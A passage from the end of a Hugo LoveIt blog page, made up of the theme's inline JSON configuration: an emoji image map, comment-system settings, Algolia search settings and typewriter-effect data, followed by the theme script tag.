e":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
